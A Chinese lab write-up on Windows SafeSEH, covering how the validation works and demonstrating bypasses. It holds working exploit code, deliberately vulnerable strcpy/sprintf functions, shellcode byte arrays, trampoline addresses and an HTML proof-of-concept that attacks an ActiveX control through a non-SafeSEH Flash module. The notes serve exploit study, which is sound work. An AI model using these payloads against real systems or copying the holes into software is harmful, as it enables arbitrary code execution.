---
title: 漏洞学习笔记-013-SafeSEH简介和简单攻击
description: SafeSEH简介和简单攻击
date: 2020-11-12 9:40:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-013-safeseh简介和简单攻击/)

## SafeSEH简介

### 工作

- 检查异常处理链是否位于当前程序的栈中。如果不在当前栈中，程序将终止异常处理函数的调用。
- 检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用。
- 在前面两项检查都通过后，程序调用一个全新的函数`RtlIsValidHandler()`，来对异常处理函数的有效性进行验证，此函数的工作如下
  - 判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。
    - 判断程序是否设置了`IMAGE_DLLCHARACTERISTICS_NO_SEH`标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。
    - 检测程序是否包含安全`S.E.H`表。如果程序包含安全`S.E.H`表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。
    - 判断程序是否设置`ILonly`标识。如果设置了这个标识，说明该程序只包含.NET编译中间语言，函数直接返回校验失败。
    - 判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测`DEP`是否开启，如果系统未开启`DEP`则返回校验成功，否则程序抛出访问违例的异常。
  - 如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行`DEP`相关检测，函数依次进行如下校验。
    - 判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测`DEP`是否开启，如果系统未开启`DEP`则返回校验成功，否则程序抛出访问违例的异常。
    - 判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。

> `RtlIsValidHandler()`函数检测流程图

![BvASMR.png](https://s1.ax1x.com/2020/11/11/BvASMR.png)

### 可行性分析

- 异常处理函数位于加载模块内存范围之外，DEP关闭
- 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全S.E.H表为空)，同时相应模块不是纯IL
- 异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH(安全S.E.H表不为空)，异常处理函数地址包含在安全S.E.H表中

> 终极方案：将shellcode布置在堆区，即使SEH验证不可行仍旧会调用

---

## 堆中绕过SEH

### 代码

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
;

char overflowcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\xE0\xFF\x12\x90"
"\x08\x3E\x39\x00" // address of shellcode in heap ;
;

void test(char * input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0;
	zero = 1 / zero;
}

void main()
{
	char* buf = (char *)malloc(500);
	strcpy(buf, shellcode);
	test(overflowcode);
}
```

### 说明

- 将shellcode放入堆区
- 栈溢出，将SEH链地址覆写为堆区shellcode的地址
- 调用SEH，随后自动触发shellcode

> 注意：注意0的情况，字符串复制是遇到0截止的

## 利用未启用SafeSEH的模块来绕过SafeSEH

### 代码

```cpp
// SEH_NOSafeSEH_JUMP.DLL
# include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
  return TRUE;
}

void jump()
{
  __asm
  {
    pop eax
    pop eax
	  retn
  }
}

// SEH_NOSafeSEH.EXE
#include <stdio.h>
#include <string.h>
#include <windows.h>

char shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xEB\x0E\x90\x90" // 220 Byte NOP, retn here, jmp to shellcode
"\x81\x11\x12\x11" // address of pop pop retn in No_SafeSEH module
"\x90\x90\x90\x90\x90\x90\x90\x90" // to prevent SEH chain stack overfill
// shellocode
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;

DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char* input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0; // prevent overfill, palce it to strcpy back

	__try
	{
		zero = 1 / zero;
	}
	__except(MyException()){}
}

int main()
{
	HINSTANCE hInst = LoadLibrary(TEXT("SEH_NOSafeSEH_JUMP.dll")); // load No_SafeSEH module

	char str[200];
	test(shellcode);
	return 0;
}
```

### 实验思路

- 使用VC6编译SEH_NOSafeSEH_JUMP.DLL，这样SEH_NOSafeSEH_JUMP.DLL将不会启用SafeSEH，使用release模式
- 使用VS2008编译SEH_NOSafeSEH.EXE，这样SEH_NOSafeSEH.EXE将会启用SafeSEH，使用release模式，编译设置为无优化
- SEH_NOSafeSEH.EXE的test函数存在明显的栈溢出漏洞，同样要求是shellcode中不能存在0
- SEH被覆盖后，制造除0异常，劫持异常处理流程

### 提前处理

- 由于`VC++ 6.0`编译的DLL默认加载基址为`0x10000000`，如果以它作为DLL的加载基址，DLL中`pop pop retn`指令地址中可能会包含`0x00`，这会在我们进行strcpy操作时会将字符串截断影响我们shellcode的复制，所以为了方便测试我们需要对基址进行重新设置。在顶部菜单中选择“工程→设置”，然后切换到“连接”选项卡，在“工程选项”的输入框中添加`/base:"0x11120000"`即可。

### 遇到的问题

- 跳板将会跳到shellcode中地址的前方4字节处，所以应当将此处放入jmp
- 经过`VS 2008`编译的程序，在进入含有`__try{}`的函数时会在`Security Cookie+4`的位置压入`−2`(`VC++ 6.0`下为`−1`)，在程序进入`__try{}`区域时程序会根据该`__try{}`块在函数中的位置而修改成不同的值。例如，函数中有两个`__try{}`块，在进入第一个`__try{}`块时这个值会被修改成`0`，进入第二个的时候被修改为`1`。如果在`__try{}`块中出现了异常，程序会根据这个值调用相应的`__except()`处理，处理结束后这个位置的值会重新修改为`−2`;如里没有发生异常，程序在离开`__try{}`块时这个值也会被修改回`−2`。当然这个值在异常处理时还有其他用途。我们只需要知道由于它的存在，我们的 shellcode可能会被破坏，所以在模块地址之后应该放入八个字节的`NOP`作为保护措施。
- 从`retn`回栈地址空间到shellcode本体之间有四个字节的不和谐因素，因此我们需要跳转到shellcode中执行

## 利用加载模块以外的地址绕过SafeSEH

> 所有的模块都默认开启了SafeSEH

### 跳板

| 地址 | 反汇编代码 |
|-|-|
| | call/jmpdword ptr[esp+0x8] |
| | call/jmpdword ptr[esp+0x14] |
| | call/jmpdword ptr[esp+0x1c] |
| | call/jmpdword ptr[esp+0x2c] |
| | call/jmpdword ptr[esp+0x44] |
| | call/jmpdword ptr[esp+0x50] |
| | call/jmp dword ptr[ebp+0xc] |
| | call/jmp dword ptr[ebp+0x24] |
| | call/jmp dword ptr[ebp+0x30] |
| | call/jmp dword ptr[ebp-0x4] |
| | call/jmp dword ptr[ebp-0xc] |
| | call/jmp dword ptr[ebp-0x18] |

### 代码

```cpp
#include <stdio.h>
#include <string.h>
#include <windows.h>

char shellcode[] = 
// shellcode start
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
// shellcode end
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90" // will be overfile with 00000000 00000000 by {__try __catch}
"\xE9\x2B\xFF\xFF\xFF\x90\x90\x90" // far jump and nop
"\xEB\xF6\x90\x90" // short jump and nop & return here
"\x0B\x0B\x29\x00" // address of call [ebp+30] in outside memory
;

DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char* input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0;

	__try
	{
		zero = 1 / zero;
	}
	__except(MyException()){}
}

int main()
{
	test(shellcode);
	return 0;
}
```

#### 漏洞执行流程

- 缓冲区溢出覆盖SEH链处理地址为模块外的地址绕过SafeSEH
- 在`0x00290B0B`处找到了一条`call [ebp+0x30]`的指令，使用它为跳板跳入shellcode

#### 面临的问题

- `0x00290B0B`包含字节`0x00`，strcpy复制时遇到它将会终止

> 解决办法：00不能缺，就让它变成shellcode的末尾算了

- 和上一节一样的问题，经过`VS 2008`编译的程序，在进入含有`__try{}`的函数时会在`Security Cookie+4`的位置压入`−2`，它将会破坏shellcode，因此我们需要跳过它，它将会覆盖的位置代码中写入了，因此我们要使用它下方的12个字节跳转到真正shellcode的入口，因此要使用两次跳转跳到入口，第一次跳转是为了跳到长跳，第二次的长跳转是为了跳入shellcode

### 利用Adobe Flash Player ActiveX控件绕过SafeSEH

#### 原理

其实这种方法就是利用未启用`SafeSEH`模块绕过`SafeSEH`的浏览器版。Flash Player ActiveX 在`9.0.124`之前的版本不支持`SafeSEH`，所以如果我们能够在这个控件中找到合适的跳板地址，就完全可以绕过SafeSEH。

- Flash插件作为找跳板的模块，因为它未启用安全SEH
- 我们构造代码模块造成栈溢出漏洞
- 构造POC html页面调用我们构造的漏洞代码
- 我们的代码模块溢出覆盖SEH链后，将会跳入我们准备好的Flash代码跳板处
- 从Flash代码跳板处跳入我们栈区的shellcode
- 漏洞利用成功

#### 代码

- 下载[IE7-for-XP-x86-中文](https://pan.moeomu.com/Tutorial/0Day安全-资料/IE7-WindowsXP-x86-chs.exe)安装包
- 下载[Flash Player ActiveX `v9.0.124`](https://pan.moeomu.com/Tutorial/0Day安全-资料/flashplayer9r124_winax.exe)安装包
- 创建一个MFC ActiveX控件，我将我创建的工程打包了一份，在此[下载](https://pan.moeomu.com/Tutorial/0Day安全-资料/VulnerAX_SEH/VulnerAX_SEH_SRC.zip)
- 详细设置图

![BzaLDA.png](https://s3.ax1x.com/2020/11/12/BzaLDA.png)

- 使用Unicode字符集，禁用编译优化选项，在静态库中使用MFC，使用release版本编译

```cpp
void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: 在此添加调度处理程序代码
	printf("moeomu"); //定位该函数的标记
	char dest[100];
	sprintf(dest, "%s", str);
}
```

- `VulnerAX_SEH.idl`中`CVulnerAX_SEHCtrl的类信息`的UUID：`ACA3927C-6BD1-4B4E-8697-72481279AAEC`

#### 其它步骤

- 注册控件：`Regsvr32 路径\控件名.ocx`
- 注册好后我们可以在web页面中以如下方式调用我们的函数

```html
<object classid="clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC" id="test">
</object>

<script>
	test.test("testest");
</script>
```

#### 触发漏洞

##### 构造POC页面

```html
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
<param name="movie" value="1.swf" />
<param name="quality" value="high" />
<embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260">
</embed>
</object>

<object classid="clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC" id="test">
</object>

<script>
	var shellcode = "";
	var s = "\u9090";
	while (s.length < 54)
	{
		s += "\u9090";
	}
	s += "\u3001\u3008";
	s += shellcode;
	test.test(s);
</script>

</body>
</html>
```

#### 分析

- 如图，ecx指向的地址`0x01DCF4FC`是溢出字符串的起始地址，距离栈顶最近的异常函数地址位于`0x01DCF610`，计算得填充`0x114`也就是276字节即可覆盖到异常处理函数地址，而第277-280字节放置跳板即可

![地址](https://s3.ax1x.com/2020/11/24/DNFQOA.png)  
![SEH链](https://s3.ax1x.com/2020/11/24/DNAZxe.png)  
![异常地址](https://s3.ax1x.com/2020/11/24/DNAV2D.png)  

- 使用`OllyFindAddr`插件的`Overflow return address->Find CALL/JMP[EBP+N]`选项查找指令，本次实验找到了`0x300B2D1C`的`CALL [EBP+0xC]`作为跳板，如图

![跳板](https://s3.ax1x.com/2020/11/24/DNAHQe.png)

- 根据前面的计算把跳板地址放到shellcode相应位置中，保存POC页面，test更改函数如下

```js
<script>
	var s = "\u9090";
	while (s.length < 138)
	{
		s += "\u9090";
	}
	s += "\u2D1C\u300B";
	test.test(s);
</script>
```

- 书上说此时触发除0异常将会转入shellcode跳板处，但是貌似事先未写入除0操作，于是再次编译插件，在test函数中加入除0操作
- 此时，成功在跳板处断下，EBP寄存器内的值是`0x01DCF150`，根据跳板指示将跳往跳板地址前的4个字节，在此可以加入一个跳转，而shellcode放到后方，如下所示

```x86asm
01DCF60C   /EB 06           jmp short 01DCF614			; jump
01DCF60E   |90              nop
01DCF60F   |90              nop
01DCF610   |1C 2D           sbb al,0x2D					; addr
01DCF612   |0B30            or esi,dword ptr ds:[eax]	; addr
01DCF614   \90              nop							; shellcode payload start
```

- 最终的test函数如下所示

```js
<script>
	var s = "\u9090";

	while (s.length < 136)
	{
		s += "\u9090";
	}

	s += "\u06EB\u9090";
	s += "\u2D1C\u300B";
	s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857";

	test.test(s);
</script>
```

- 成功执行如图

![执行成功](https://s3.ax1x.com/2020/11/24/DNljGd.png)
